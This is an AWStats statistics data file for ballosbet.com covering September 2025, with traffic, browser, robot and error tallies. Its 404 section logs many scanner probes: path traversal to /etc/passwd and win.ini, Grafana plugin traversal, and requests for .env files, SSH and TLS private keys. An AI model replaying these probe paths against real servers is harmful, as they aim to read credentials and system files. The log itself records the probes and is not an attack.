@@ -1,0 +1,2976 @@
+AWSTATS DATA FILE 7.9 (build 20230108)
+# If you remove this file, all statistics for date 202509 will be lost/reset.
+# Last config file used to build this data file was /home3/dannygue/tmp/awstats/ssl/awstats.ballosbet.com.dannyguevarapumacall1757803038399.0870194.misitiohostgator.com.conf.
+
+# Position (offset in bytes) in this file for beginning of each section for
+# direct I/O access. If you made changes somewhere in this file, you should
+# also remove completely the MAP section (AWStats will rewrite it at next
+# update).
+BEGIN_MAP 28
+POS_GENERAL 2112                
+POS_TIME 2779                
+POS_VISITOR 93157               
+POS_DAY 103356              
+POS_DOMAIN 3709                
+POS_LOGIN 4360                
+POS_ROBOT 4515                
+POS_WORMS 5197                
+POS_EMAILSENDER 5328                
+POS_EMAILRECEIVER 5471                
+POS_SESSION 103876              
+POS_FILESIZE 108950              
+POS_SIDER 104073              
+POS_FILETYPES 5606                
+POS_DOWNLOADS 5928                
+POS_OS 5976                
+POS_BROWSER 6595                
+POS_SCREENSIZE 12153               
+POS_UNKNOWNREFERER 12227               
+POS_UNKNOWNREFERERBROWSER 13247               
+POS_ORIGIN 13785               
+POS_SEREFERRALS 13927               
+POS_PAGEREFS 14107               
+POS_SEARCHWORDS 14447               
+POS_KEYWORDS 14599               
+POS_MISC 2441                
+POS_ERRORS 14658               
+POS_CLUSTER 4216                
+POS_SIDER_404 14885               
+END_MAP
+
+# LastLine    = Date of last record processed - Last record line number in last log - Last record offset in last log - Last record signature value
+# FirstTime   = Date of first visit for history file
+# LastTime    = Date of last visit for history file
+# LastUpdate  = Date of last update - Nb of parsed records - Nb of parsed old records - Nb of parsed new records - Nb of parsed corrupted - Nb of parsed dropped
+# TotalVisits = Number of visits
+# TotalUnique = Number of unique visitors
+# MonthHostsKnown   = Number of hosts known
+# MonthHostsUnKnown = Number of hosts unknown
+BEGIN_GENERAL 8
+LastLine 20251001010643 13 2541 11875714666094
+FirstTime 0
+LastTime 20250930225041
+LastUpdate 20251001210406 13 0 12 0 0
+TotalVisits 425                 
+TotalUnique 232                 
+MonthHostsKnown 0                   
+MonthHostsUnknown 270                 
+END_GENERAL
+
+# Misc ID - Pages - Hits - Bandwidth
+BEGIN_MISC 10
+DirectorSupport 0 0 0
+QuickTimeSupport 0 0 0
+JavascriptDisabled 0 0 0
+PDFSupport 0 0 0
+RealPlayerSupport 0 0 0
+FlashSupport 0 0 0
+WindowsMediaPlayerSupport 0 0 0
+JavaEnabled 0 0 0
+AddToFavourites 0 375 0
+TotalMisc 0 0 0
+END_MISC
+
+# Hour - Pages - Hits - Bandwidth - Not viewed Pages - Not viewed Hits - Not viewed Bandwidth
+BEGIN_TIME 24
+0 19 23 167050 177 193 1259338
+1 20 20 125247 161 203 1072132
+2 20 31 530216 155 195 1530165
+3 20 26 295577 136 171 1188411
+4 57 69 781701 218 255 1697570
+5 77 95 929066 617 666 5449967
+6 91 96 921297 529 590 4366579
+7 103 133 1604325 639 716 5012351
+8 102 128 1594042 587 608 4773580
+9 103 114 1320193 734 772 5709928
+10 104 115 1575681 607 656 5537948
+11 140 145 1803855 618 662 4776465
+12 83 88 1194748 1387 1419 17269398
+13 99 110 1420130 419 430 3983288
+14 111 136 1701799 1237 1278 3505135
+15 94 102 1284459 607 735 11238216
+16 87 98 1186896 641 674 4375946
+17 175 311 3751937 1128 1320 12380044
+18 184 262 6033217 1161 1244 5090338
+19 121 130 1637687 549 642 4056448
+20 92 126 2374385 242 305 1050538
+21 58 83 921387 164 229 886566
+22 65 71 858974 437 503 3316454
+23 22 36 373536 156 187 1052474
+END_TIME
+
+# Domain - Pages - Hits - Bandwidth
+# The 25 first Pages must be first (order not required for others)
+BEGIN_DOMAIN 30
+us 1548 1760 20226323
+cn 119 129 1886995
+co 87 172 3537986
+in 79 94 1374698
+ar 61 125 4410779
+ca 32 33 353375
+ru 14 51 531383
+pe 13 33 376872
+ro 11 21 241684
+lt 10 10 100811
+gb 8 23 265680
+ir 7 21 210132
+tw 6 6 81560
+cz 6 14 153027
+sc 6 6 81498
+se 6 6 81560
+eg 5 8 66655
+de 5 5 37875
+no 4 4 54332
+bg 4 4 54394
+zz 2 2 27166
+rs 2 2 27166
+au 2 3 31347
+th 2 2 27228
+pl 2 2 36778
+jp 0 5 24422
+pa 2 2 27166
+ao 0 1 4119
+be 2 2 27166
+sa 2 2 27228
+END_DOMAIN
+
+# Cluster ID - Pages - Hits - Bandwidth
+BEGIN_CLUSTER 0
+END_CLUSTER
+
+# Login - Pages - Hits - Bandwidth - Last visit
+# The 10 first Pages must be first (order not required for others)
+BEGIN_LOGIN 0
+END_LOGIN
+
+# Robot ID - Hits - Bandwidth - Last visit - Hits on robots.txt
+# The 25 first Hits must be first (order not required for others)
+BEGIN_ROBOT 15
+bingbot/ 151 56823 20250930201939 17
+Googlebot/ 121 645409 20250930220124 22
+curl 62 2505715 20250928204608 0
+Dalvik/ 22 223176 20250928194325 0
+unknown 14 1446 20250925013950 14
+no_user_agent 14 475172 20250929030924 0
+(firefox/)([0-9]\.|[0-1][0]\.) 8 108788 20250924190612 0
+fetcher 6 101544 20250916182440 4
+Applebot/ 6 64446 20250921164153 2
+YandexBot/ 4 27394 20250930180829 2
+Googlebot\-Image/ 3 12357 20250930205545 0
+crawl 2 27166 20250922002151 0
+BW/ 2 36778 20250921054142 0
+Firefox/1\.5 2 27166 20250926190500 0
+java 1 0 20250922002150 0
+END_ROBOT
+
+# Worm ID - Hits - Bandwidth - Last visit
+# The 5 first Hits must be first (order not required for others)
+BEGIN_WORMS 0
+END_WORMS
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first Hits must be first (order not required for others)
+BEGIN_EMAILSENDER 0
+END_EMAILSENDER
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first hits must be first (order not required for others)
+BEGIN_EMAILRECEIVER 0
+END_EMAILRECEIVER
+
+# Files type - Hits - Bandwidth - Bandwidth without compression - Bandwidth after compression
+BEGIN_FILETYPES 14
+svg 4 7012 0 0
+css 99 545139 0 0
+js 249 2523124 0 0
+png 74 1672515 0 0
+Unknown 69 559133 0 0
+woff 1 23644 0 0
+html 1542 21257180 0 0
+gif 46 36467 0 0
+php 377 2076164 0 0
+webp 4 519880 0 0
+xml 10 4373 0 0
+db 2 9354 0 0
+jpg 25 901012 0 0
+woff2 46 4252408 0 0
+END_FILETYPES
+
+# Downloads - Hits - Bandwidth
+BEGIN_DOWNLOADS 0
+END_DOWNLOADS
+
+# OS ID - Hits
+BEGIN_OS ID - Hits - Pages 38
+beos 1 0
+androidpie 4 4
+winlong 6 1
+win7 17 14
+macosx14 13 13
+win10 467 300
+macosx6 7 7
+win11 33 21
+macosx8 3 3
+ios_iphone 109 44
+unix 9 9
+winxp 3 3
+win8 4 4
+linuxcentos 49 49
+android11 15 4
+androidhoneycomb 2 2
+android10 28 14
+android12 2 2
+macos12 60 60
+win16 1 0
+androidoreo 19 9
+macosx9 10 10
+macosx 114 114
+linux 572 489
+macos11 5 5
+macosx12 5 5
+Unknown 278 260
+linuxdebian 65 65
+macosx15 376 289
+androidmarshmallow 45 37
+macosx13 19 14
+macosx11 31 31
+winnt 14 14
+androidlollipop 2 2
+linuxubuntu 132 132
+androidnougat 13 8
+macosx10 7 6
+win2000 8 3
+END_OS
+
+# Browser ID - Hits - Pages
+BEGIN_BROWSER 296
+chrome140.0.7339.127 22 22
+chrome116.0.0.0 133 67
+safari13.0.5 3 3
+chrome122.0.0.0 12 12
+firefox106.0 2 2
+chrome90.0.4430.93 3 3
+chrome121.0.0.0 26 20
+safari17.6 4 4
+safari15.6.6 3 3
+firefox122.0 22 22
+chrome83.0.812 2 2
+chrome100.0.4896.79 6 1
+safari6.0.2 3 3
+iphone 10 5
+firefox112.0 3 3
+chrome128.0.0.0 20 20
+chrome45.0.2454.85 1 1
+chrome103.0.0.0 2 2
+chrome73.0.3683.103 2 2
+chrome91.0.4472.168 1 1
+chrome86.0.892 2 2
+chrome90.0.2787 2 2
+safari18.0 3 3
+chrome63.0.2004 2 2
+firefox137.0 1 1
+chrome96.0.4664.110 3 2
+chrome100.0.4896.127 6 1
+chrome125.0.0.0 36 29
+safari11.1.1 1 1
+chrome91.0.4472.124 7 0
+safari13 4 4
+chrome76.0.3809.111 2 2
+safari8.0 5 5
+chrome95.0.1788 1 1
+safari5.0.5 2 2
+chrome7.0.514.0 2 2
+safari13.1.2 2 2
+safari13.1 2 2
+chrome76.0.3809.132 4 4
+safari15.6.3 1 1
+safari18.2 5 5
+chrome36.0.1985.125 2 2
+chrome106.0.0.0 1 0
+msie6.0 4 4
+edge120 2 2
+firefox93.0 2 1
+safari17.7 3 3
+safari17.4.1 2 2
+chrome117.0.0.0 3 0
+chrome92.0.553 1 1
+Unknown 257 244
+firefox119.0 2 2
+firefox88.0 2 2
+chrome85.0.902 1 1
+chrome103.0.577 1 1
+firefox129.0 11 11
+chrome140.0.0.0 207 102
+chrome57.0.1681 1 1
+chrome70.0.2324 2 2
+firefox128.9 2 2
+edge119 1 1
+safari5.1 4 4
+safari13.0.3 3 3
+firefox82.0 2 2
+chrome30.0.1551.0 1 1
+firefox120.0 113 113
+firefox128.0 20 20
+edge17 1 0
+firefox118.0 14 14
+chrome59.0.1351 2 2
+safari17.3.1 3 3
+safari1.3.1 2 2
+chrome60.0.3112.32 2 2
+edge104 2 2
+safari12.1.2 3 3
+chrome119.0.0.0 19 19
+safari18.3 15 15
+safari16.5.1 1 1
+safari17.0.96 2 2
+chrome86.0.224 1 1
+safari4.0.4 2 2
+chrome54.0.2401 1 1
+firefox94.0 1 1
+chrome48.0.2564.116 2 2
+chrome61.0.3163.100 2 2
+safari17.11 1 1
+opera10.00 6 1
+chrome104.0.819 1 1
+edge18 7 2
+safari18.5 4 4
+safari16.3.1 1 1
+chrome114.0.0.0 85 85
+chrome67.0.2885 1 1
+chrome81.0.2706 1 1
+safari17.10 2 2
+safari18.4 7 7
+chrome92.0.4515.145 2 2
+edge14 1 1
+safari15.6 7 7
+chrome101.0.2362 1 1
+firefox99.0 1 1
+firefox121.0 21 21
+chrome86.0.1512 1 1
+safari17.2.1 1 1
+firefox111.0 2 2
+mozilla 12 11
+safari13.1.3 3 3
+chrome49.0.2623.112 5 4
+safari 116 77
+chrome80.0.3987.163 5 0
+opera9.64 2 2
+chrome89.0.742 1 1
+chrome94.0.1067 1 1
+chrome104.0.2389 1 1
+chrome104.0.2599 1 1
+chrome131.0.0.0 30 15
+chrome109.0.0.0 4 4
+chrome57.0.2987.108 4 4
+safari9.1.2 1 1
+chrome101.0.4951.54 6 1
+chrome73.0.1771 1 1
+chrome94.0.2370 1 1
+chrome132.0.0.0 45 38
+chrome104.0.1334 1 1
+chrome83.0.4103.106 2 2
+firefox123.0 24 24
+safari5.0.3 3 3
+safari17.8.1 5 5
+firefox113.0 2 2
+chrome138.0.0.0 4 2
+chrome74.0.3729.169 3 3
+chrome47.0.2526.106 30 30
+chrome55.0.2812 1 1
+chrome63.0.3239.111 5 0
+safari18.1 8 8
+firefox49.0 1 1
+sonyericsson 2 2
+firefox114.0 1 1
+chrome92.0.4515.107 2 0
+firefox124.0 23 23
+chrome135.0.0.0 28 26
+opera94.0.0.0 2 2
+msie9.0 1 0
+firefox115.0 6 6
+chrome67.0.1145 1 1
+edge44 10 10
+edge13 1 1
+firefox125.0 11 11
+edge16 1 1
+firefox131.0 9 9
+safari16.2 1 1
+chrome83.0.4103.61 2 2
+safari9.0.2 1 1
+chrome134.0.6998.166 15 3
+safari15.0 6 6
+chrome130.0.0.0 22 14
+chrome52.0.239 1 1
+chrome98.0.4758.119 6 1
+firefox103.0 1 1
+safari10.1.2 1 1
+safari14.0.3 4 4
+chrome102.0.330 1 1
+chrome75.0.3770.100 3 3
+netscape5.0 14 8
+android 2 2
+edge113 2 2
+chrome84.0.4147.89 2 2
+chrome64.0.449 2 2
+chrome74.0.181 1 1
+safari14.1 1 1
+msie7.0 6 1
+safari14.1.2 2 1
+chrome95.0.4638.69 3 3
+chrome99.0.4844.84 2 2
+opera62.0.3331.101 2 2
+chrome80.0.1577 2 2
+chrome61.0.591 1 1
+chrome77.0.1456 2 2
+safari17.4 2 2
+safari17.5 10 10
+chrome91.0.2723 1 1
+chrome100.0.4896.136 2 2
+firefox105.0 2 2
+safari13.0.4 2 2
+firefox135.0 15 15
+safari18.0.1 17 9
+chrome93.0.104 1 1
+chrome137.0.0.0 5 0
+chrome103.0.2731 1 1
+edge114 3 3
+chrome71.0.3578.98 2 2
+chrome105.0.2831 1 1
+chrome117.0.5938.132 6 1
+firefox134.0 20 20
+edge111 2 2
+chrome79.0.3945.79 8 3
+safari11.1 2 2
+chrome96.0.1340 1 1
+chrome129.0.0.0 24 24
+safari17.6.1 2 2
+chrome69.0.2167 1 1
+seamonkey 1 0
+safari15.2 1 1
+chrome91.0.4472.114 1 0
+firefox133.0 26 26
+safari16.0 6 1
+chrome13.0.782.41 1 0
+firefox55.0 2 2
+chrome133.0.0.0 36 36
+chrome72.0.315 1 1
+safari17.1.2 4 4
+chrome69.0.1979 1 1
+chrome124.0.0.0 23 23
+chrome94.0.4606.61 7 0
+chrome127.0.0.0 18 18
+safari15.5 1 1
+edge126 2 2
+chrome85.0.2112 2 2
+chrome62.0.3202.94 2 2
+safari15.4 1 0
+safari18.1.1 4 4
+firefox127.0 17 17
+chrome58.0.3029.110 4 4
+chrome125.0.6422.26 7 2
+safari11.0 2 2
+chrome77.0.1002 2 2
+chrome60.0.3112.90 1 0
+firefox117.0 9 9
+chrome139.0.0.0 18 18
+chrome94.0.897 1 1
+opera11.01 1 0
+edge121 2 2
+safari16.1 3 3
+firefox109.0 3 2
+safari17.9 1 1
+chrome88.0.4324.182 2 2
+chrome55.0.1341 1 1
+firefox132.0 38 38
+chrome68.0.1365 1 1
+chrome63.0.2836 1 1
+safari17.0 9 9
+chrome123.0.0.0 23 23
+firefox100.0 4 4
+chrome134.0.0.0 36 36
+safari16.6.1 6 6
+safari17.8 3 3
+safari5.0.4 2 2
+chrome60.0.1030 1 1
+edge15 2 2
+chrome51.0.2010 2 2
+safari15.1 2 2
+chrome125.0.6422.60 11 1
+chrome77.0.3865.75 4 4
+chrome101.0.4951.41 11 5
+chrome104.0.401 1 1
+chrome118.0.0.0 10 10
+safari15.6.7 5 5
+firefox130.0 22 22
+chrome90.0.2683 2 2
+chrome120.0.0.0 19 19
+safari16.3 4 4
+chrome61.0.3163.128 6 6
+firefox116.0 3 3
+chrome99.0.841 1 1
+chrome79.0.2335 1 1
+firefox11.0 2 2
+firefox126.0 5 5
+firefox102.0 4 4
+safari17.2 3 3
+chrome78.0.1528 1 1
+chrome98.0.1061 1 1
+firefox95.0 1 1
+firefox139.0 6 4
+chrome65.0.696 1 1
+safari15.6.1 4 4
+chrome57.0.2987.132 6 6
+chrome105.0.2531 2 2
+edge123 1 1
+chrome126.0.0.0 23 23
+safari10.0 16 11
+edge117 5 5
+safari13.0.1 1 1
+safari16.5 8 3
+chrome138.0.7204.23 55 5
+safari18.3.1 4 4
+safari14.0 9 7
+chrome115.0.0.0 8 3
+firefox91.0 3 0
+safari12.1.1 3 3
+safari7.1 2 2
+chrome83.0.4103.97 1 0
+chrome61.0.23 1 1
+firefox92.0 2 0
+safari16.4 3 3
+msie5.5 6 1
+firefox78.0 2 2
+END_BROWSER
+
+# Screen size - Hits
+BEGIN_SCREENSIZE 0
+END_SCREENSIZE
+
+# Unknown referer OS - Last visit date
+BEGIN_UNKNOWNREFERER 15
+Mozilla/5.0_(compatible;_InternetMeasurement/1.0;__https://internet-measurement.com/) 20250914192434
+SonyEricssonK750i/R1CA_Browser/SEMC-Browser/4.2_Profile/MIDP-2.0_Configuration/CLDC-1.1 20250917085328
+python-httpx/0.28.1 20250925061831
+Opera/9.80_(S60;_SymbOS;_Opera_Mobi/499;_U;_ru)_Presto/2.4.18_Version/10.00 20250927102926
+7h3h4ckv157 20250918090521
+WordPress/6.8.3;_https://ballosbet.com 20250930215753
+Hello_from_Palo_Alto_Networks,_find_out_more_about_our_scans_in_https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity 20250930181158
+fasthttp 20250920043023
+Python/3.13_aiohttp/3.12.13 20250925144454
+WhatsApp/2.2535.3_W 20250914175033
+Mozilla/5.0_(compatible;_Dataprovider.com) 20250915125157
+WordPress/6.8.2;_https://ballosbet.com 20250930180830
+okhttp/4.9.2 20250923171527
+Mozilla/5.0_(compatible;_CensysInspect/1.1;__https://about.censys.io/) 20250928075319
+Mozilla/5.0_zgrab/0.x 20250925205047
+END_UNKNOWNREFERER
+
+# Unknown referer Browser - Last visit date
+BEGIN_UNKNOWNREFERERBROWSER 9
+python-httpx/0.28.1 20250925061831
+WordPress/6.8.2;_https://ballosbet.com 20250930180830
+7h3h4ckv157 20250918090521
+Hello_from_Palo_Alto_Networks,_find_out_more_about_our_scans_in_https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity 20250930181158
+WordPress/6.8.3;_https://ballosbet.com 20250930215753
+fasthttp 20250920043023
+Python/3.13_aiohttp/3.12.13 20250925144454
+okhttp/4.9.2 20250923171527
+WhatsApp/2.2535.3_W 20250914175033
+END_UNKNOWNREFERERBROWSER
+
+# Origin - Pages - Hits 
+BEGIN_ORIGIN 6
+From0 1718 1808
+From1 2 2
+From2 15 15
+From3 8 8
+From4 304 715
+From5 0 0
+END_ORIGIN
+
+# Search engine referers ID - Pages - Hits
+BEGIN_SEREFERRALS 2
+www_google_com 10 10
+google_com 5 5
+END_SEREFERRALS
+
+# External page referers - Pages - Hits
+# The 25 first Pages must be first (order not required for others)
+BEGIN_PAGEREFS 5
+http://pincomb.buzz 2 2
+https://webmail.olafhammelburg-fotografie.nl 2 2
+https://allthecom.info/new/ballosbet.com/ 2 2
+http://69.6.213.228:80/wp-login.php 1 1
+https://cliente.hostgator.pe 1 1
+END_PAGEREFS
+
+# Search keyphrases - Number of search
+# The 10 first number of search must be first (order not required for others)
+BEGIN_SEARCHWORDS 0
+END_SEARCHWORDS
+
+# Search keywords - Number of search
+# The 25 first number of search must be first (order not required for others)
+BEGIN_KEYWORDS 0
+END_KEYWORDS
+
+# Errors - Hits - Bandwidth
+BEGIN_ERRORS 11
+500 284 207954
+409 1261 1280480
+404 6471 103744125
+400 184 9862
+302 174 1022
+421 4 1288
+405 2 0
+406 1753 396178
+403 90 558495
+401 2 242
+301 3599 1689
+END_ERRORS
+
+# URL with 404 errors - Hits - Last URL referrer
+BEGIN_SIDER_404 1893
+/..%5C..%5C..%5Cetc/passwd 1 -
+/public/plugins/aquaqanalytics-kdbadaptor-datasource/../../../../../conf/defaults.ini 1 -
+//.ssh/id_rsa_4096 1 -
+/merchant/z/payment/ 2 -
+/CFIDE/wizards/common/utils.cfc 11 -
+//cms/application/configs/application.ini 1 -
+/php/upload.php 5 -
+/public/plugins/aquaqanalytics-kdbbackend-datasource/../../../../../conf/defaults.ini 1 -
+//certificates/ballosbet.com_priv.pem 1 -
+/cgi-bin/downloadFlile.cgi 2 -
+/public/plugins/opentsdb/../../../../../conf/defaults.ini 1 -
+/public/plugins/petrslavotinek-carpetplot-panel/../../../../../conf/defaults.ini 1 -
+/ispirit/interface/gateway.php 3 -
+/showresource.do 2 https://ballosbet.com/j_security_check
+/api/experimental/dags/example_trigger_target_dag/dag_runs 2 -
+/ 17 -
+/public/plugins/parseable-parseable-datasource/../../../../../conf/defaults.ini 1 -
+/bower_components/angular-base64-upload/demo/server.php 2 -
+/invoker/JMXInvokerServlet/ 3 -
+/.antproxy.php 2 -
+/CDGServer3/SystemConfig 64 -
+/ssl_key.txt 1 -
+/modules/miniform/ajax_delete_message.php 1 -
+/dashboard/uploadID.php 1 -
+/WebInterface/ 2 -
+/index.html 4 -
+/user 2 -
+/model-versions/get-artifact 4 -
+/mbilling/index.php/authentication/login 6 -
+/32ry0kWH6sOXHDq9aaVzp3BpGCT.txt 2 https://ballosbet.com/advance/portfwd.html
+//ballosbet.com/xmlrpc.php 2 -
+//admin/server_import.php 1 -
+/index/login.cgi 1 -
+/Collector/diagnostics/ping 2 -
+/public/plugins/geomap/../../../../../conf/defaults.ini 1 -
+/RPC2 3 -
+/webui/gui_states/index.json 1 -
+/public/plugins/mtanda-heatmap-epoch-panel/../../../../../conf/defaults.ini 1 -
+/html/ad/adfilestorage/request/checkAcesso.php 2 -
+/workflow/servlet/pdf_servlet 2 -
+/public/plugins/grafana-kairosdb-datasource/../../../../../conf/defaults.ini 1 -
+/ajax/api/user/save 2 -
+/Org/service/Service.asmx/GetUserByEmployeeCode 2 -
+/cgi-bin/skk_get.cgi 2 -
+/icons/../../../../../../etc/passwd 1 -
+/public/plugins/status/../../../../../conf/defaults.ini 1 -
+/public/plugins/skydive-datasource/../../../../../conf/defaults.ini 1 -
+/32rBXA8ltUXZ7kC8VbL8R2VQ6w1.jsp/ 1 -
+/druid/submitLogin 2 -
+/res.php 1 -
+/wp-content/plugins/LayerSlider/assets/static/public/front.css 1 -
+/workrelate/plan/util/uploaderOperate.jsp 2 -
+/RPC2_Login 4 -
+/site_cg/application/configs/application.ini 1 -
+/api/v1/database/3 10 -
+/public/plugins/computest-cloudwatchalarm-datasource/../../../../../conf/defaults.ini 1 -
+/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini 1 -
+/sites/web_vhost_domain_list.php 6 https://ballosbet.com/index.php
+/public/plugins/michaeldmoore-scatter-panel/../../../../../conf/defaults.ini 1 -
+/core/ajax/user.ajax.php 1 -
+/service/v1/createUser 2 -
+/html/usr/share/doc/hostname/copyright%3F 1 -
+/mgmt/shared/iapp/rpm-spec-creator 2 -
+/web/cgi-bin/usbinteract.cgi 2 -
+//.env.ballosbet 2 -
+/api/pull 2 -
+/bFuA52 2 -
+/api/v1/database/2 10 -
+/certs/ballosbet.com_private.key 1 -
+/classes/common/busiFacade.php 2 -
+/images/logo/logo-eoffice.php 4 -
+/public/plugins/aidanmountford-html-panel/../../../../../conf/defaults.ini 1 -
+/login/verify 2 www.ballosbet.com/login/index
+/404%0Dnew-header:value%0Da: 1 -
+/storfs-asup 1 -
+/general/bi_design/appcenter/report_bi.func.php 2 -
+/public/plugins/hamedkarbasi93-nodegraphapi-datasource/../../../../../conf/defaults.ini 1 -
+/m/apmarketplace/passwordrecovery 2 https://www.ballosbet.com
+/public/plugins/corpglory-progresslist-panel/../../../../../conf/defaults.ini 1 -
+/controller/login.php 4 -
+/public/plugins/grafana-snowflake-datasource/../../../../../conf/defaults.ini 1 -
+/cgi-bin/cgiServer 2 -
+/plugin/customMethod 2 -
+/loginregister/ 2 -
+//.env.www 2 -
+/public/plugins/grafana-metrics-enterprise-app/../../../../../conf/defaults.ini 1 -
+/public/plugins/orchestracities-map-panel/../../../../../conf/defaults.ini 1 -
+/mgmt/shared/authn/login 6 -
+//.env.production.local 3 -
+/en-US/login 2 -
+/public/plugins/teamviewer-datasource/../../../../../conf/defaults.ini 1 -
+/objects/getImage.php 2 -
+/public/plugins/meteostat-meteostat-datasource/../../../../../conf/defaults.ini 1 -
+/sys/dict/loadTreeData 4 -
+/dip/api/login 2 -
+/api/blade-user/user-list 6 -
+/hac/login 2 -
+/process/aprocess.php 2 -
+/EXCU_SHELL 2 -
+//.ssh/id_rsa_3072 1 -
+/cgi 3 http://www.ballosbet.com/mainFrame.htm
+/mobile/plugin/browser.jsp 4 -
+/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini 1 -
+/api/jobs/ 2 -
+/data/settings/settings.xml 1 -
+/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd 1 -
+/signin 4 -
+/cgi-bin/K2wQkD.txt 1 -
+/cgi-bin/usbinteract.cgi 2 -
+/php/utils/CmsGetDeviceSoftwareVersion.php/.js.map 1 -
+/.well-known/traffic-advice 4 -
+/os/mxperson 2 -
+//ssl/ballosbet.com.key 1 -
+/public/plugins/grafana-enterprise-traces-app/../../../../../conf/defaults.ini 1 -
+/.ssh/id_rsa_2048 1 -
+/file-manager/ 2 -
+/PMA/server_import.php 1 -
+/console/images/%252e%252e%252fconsole.portal 2 -
+/gremlin 2 -
+//config/jwt/private.pem 1 -
+/js/jquery_file_upload/server/php/ 2 -
+/public/plugins/nikosc-percenttrend-panel/../../../../../conf/defaults.ini 1 -
+/userLogin.asp 2 -
+/modules/cartabandonmentpro/upload.php 2 -
+/author/admin/ 2 https://ballosbet.com/
+/uapjs/jsinvoke/ 4 -
+/xmlpserver/ReportTemplateService.xls 2 -
+/index.asp 6 -
+/adminPage/remote/cmdOver 2 -
+/wp-json/sure-triggers/v1/connection/create-wp-connection 2 -
+/test_404_page/ 2 -
+/.well-known/mta-sts.txt 2 -
+/WS/Basic/Basic.asmx 1 -
+/jolokia/read/getDiagnosticOptions 3 -
+/public/plugins/grafana-newrelic-datasource/../../../../../conf/defaults.ini 1 -
+//certificates/ballosbet.com.pfx 1 -
+/................etc/passwd 1 -
+/session/create 2 -
+/wp-json/seopress/v1/posts/1/title-description-metas 2 -
+/index/gettunnel 1 -
+/%C0%AE/%C0%AE/WEB-INF/web.xml 1 -
+/logos_clients/32ry0A20WadFET3ZjSOycg3PF40.php 2 -
+/public/plugins/jasonlashua-prtg-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/pixie-pixie-datasource/../../../../../conf/defaults.ini 1 -
+/admin/phpMyAdmin/server_import.php 1 -
+/wp-content/plugins/quiz-master-next/tests/_support/AcceptanceTester.php 2 -
+/public/plugins/frser-sqlite-datasource/../../../../../conf/defaults.ini 1 -
+/default.aspx 2 -
+/geoserver/ows 6 -
+/public/plugins/sskgo-perfcurve-panel/../../../../../conf/defaults.ini 1 -
+/public/plugins/boazreicher-sierraplot-panel/../../../../../conf/defaults.ini 1 -
+/x_organization_assemble_authentication/jaxrs/authentication/captcha 1 -
+/dfsms/add-category.php 2 -
+/public/plugins/fetzerch-sunandmoon-datasource/../../../../../conf/defaults.ini 1 -
+/5/130/narodanimat-1/index.html 2 -
+//admin/configs/application.ini 1 -
+/api/presets/ 2 -
+/public/plugins/xginn8-pagerduty-datasource/../../../../../conf/defaults.ini 1 -
+/api/hassio/app/.%252e/supervisor/info 2 -
+/Config/SaveUploadedHotspotLogoFile 3 https://www.ballosbet.com/
+/cms/content/list.do 2 -
+/public/plugins/vonage-status-panel/../../../../../conf/defaults.ini 1 -
+/api/v2/observables/extended 2 -
+/nacos/v1/auth/users/ 2 -
+/templates/editor-preload-container 1 -
+/adxmlrpc.php 2 -
+//.env.development.local 3 -
+/v1/32ry0sLgi58T6WONkYu1nEOJTmF.php 2 -
+/html/usr/share/doc/hostname/copyright%3f 1 -
+/apt/v1/context 2 -
+//%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini 1 -
+/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/32rBX4LrV176T3H8tHhMOjQB8nj.jsp 1 -
+/scim/Users 2 -
+/backupsettings.dat 4 -
+/api/v2/open/rowsInfo 2 -
+/.well-known/change-password 2 -
+//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd 1 -
+/author/root 2 https://ballosbet.com/
+/crowd/plugins/servlet/exp 2 -
+/dolphinscheduler/login 2 -
+/membership-registration/ 2 -
+/wp-content/plugins/wpbookit/README.txt 2 -
+//cloudexp/application/configs/application.ini 1 -
+/soap.cgi 3 -
+/webadmin/out 2 https://ballosbet.com/webadmin/admin/service_manager_data.php
+/management/export.php 2 -
+/two_fact_auth 2 https://ballosbet.com/configurations
+/emap/webservice/gis/soap/bitmap 2 -
+/cgi-bin/vitogate.cgi 4 -
+/images/..%2fcgi/cgi_i_filter.js 2 https://www.ballosbet.com//info.html
+/api/login/ 1 -
+/ballosbet.com/xmlrpc.php 2 -
+/reliance/resources/sessions 2 -
+/WebConfig/lua/auth.lua 3 https://www.ballosbet.com/
+/json-rpc/ 2 -
+//.env.local 3 -
+//%c0%ae/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml 1 -
+/users/login 3 -
+/public/plugins/grafana-iot-twinmaker-app/../../../../../conf/defaults.ini 1 -
+/l50p9.php 2 -
+/php/renamefile.php 2 -
+/suite-api/api/auth/token/acquire 1 https://www.ballosbet.com/ui/
+/host.key 1 -
+/api/authenticate 2 -
+/context.json 4 -
+/ajax-api/2.0/mlflow/registered-models/create 8 -
+/static/..%5C..%5C..%5Cetc/passwd 1 -
+/cgi-bin/DownloadCfg/RouterCfm.cfg 8 -
+/userpost/xerox.set 2 -
+//phpMyAdmin/server_import.php 1 -
+/public/plugins/zipkin/../../../../../conf/defaults.ini 1 -
+/public/plugins/dashlist/../../../../../conf/defaults.ini 1 -
+/restrito/ 2 -
+/public/plugins/natel-discrete-panel/../../../../../conf/defaults.ini 1 -
+/WAN_wan.htm 2 -
+/plugins/3rdPartyServers/ox3rdPartyServers/max.class.php 2 -
+/public/plugins/barchart/../../../../../conf/defaults.ini 1 -
+/.env.dev 2 -
+/website/blog/ 3 -
+/wp-content/plugins/quiz-master-next/README.md 2 -
+/upload/caabcca.html 2 -
+//.env.save 2 -
+/ajax/ticket_user_db.php 1 -
+/apriso/portal/kiosk/querylogin.aspx 2 -
+/miscadmin 8 -
+/api/v1/database/7 10 -
+/global-protect/login.esp 2 -
+/eam/vib 6 -
+/public/plugins/quasardb-datasource/../../../../../conf/defaults.ini 1 -
+/tracking/client_1/read-instruction 2 -
+/inspector/graph/interact 2 -
+/portalapi/actuator 2 -
+/wp-json/am-member/license 2 -
+/public/plugins/parca-panel/../../../../../conf/defaults.ini 1 -
